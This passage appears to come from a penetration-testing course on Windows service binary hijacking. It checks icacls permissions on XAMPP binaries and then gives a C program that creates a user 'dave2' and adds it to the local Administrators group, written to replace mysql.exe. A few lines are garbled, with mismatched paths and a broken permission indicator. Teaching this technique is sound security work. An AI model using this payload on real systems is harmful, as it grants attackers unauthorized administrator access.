# Listing 412 - icacls permissions mask

Let's use icacls on the Apache binary httpd.exe first.

```
PS C:\Users\dave icacls "C:\xampp\apache\bin\httpd.exe"
C:\xampp\apache\httpd.exe BUILTIN:(F)
NT AUTHORITY\SYSTEM:(F)
  BUILTIN\Users:(RX)
NT AUTHORITY\Authenticated Users:(RX)
```

Successfully processed 1 files; Failed processing 0 files

Listing 413 - Permissions of httpd.exe

As member of the built-in Users group, dave has only Read and Execute (RX) rights on httpd.exe, meaning we cannot replace the file with a malicious binary.

Next, we will create mysql from the mysql source.

```
PS C:\Users\dave icacls "C:\xampp\mysql\bin\mysql.exe"
C:\xampp\mysql\mysql.exe NT AUTHORITY\SYSTEM:(F)
  BUILTIN\Administrators:(F)
  BUILTIN\Users:(F)
```

Successfully processed 1 files; Failed processing 0 files

Listing 414 - Permissions of mysql.exe

The output of Listing 414 shows that members of the Users group have the Full Access (F) permission, allowing us to write and modify the binary and therefore, replace it. Due to the missing indicator ( preceding this permission, it was set on purpose and not inherited by the parent directory. Administrators often set Full Access permissions when they configure a service and are not sure about the required permissions. Setting to Full Access avoids most permission problems, but creates a security risk as we will show in this example.

Let's create a small binary on Kali, which we will use to replace the original mysql.exe. The following C will create a user named dave2 and add that to the local Administrators group using the system79 function. The cross-compiled version of this code will serve as our malicious binary. Let's save it on Kali in a file named addUser.c.

```
#include <stdlib.h>

int main ()
{
  int i;

  i = system("net user dave2 password123! /add");
  i = system("net localgroup administrators dave2 /add");

  return 0;
}
```

Listing 415 - addUser.c code

> 79(Man7, 2022), https://man7.org/linux/man-pages/man3/system.html
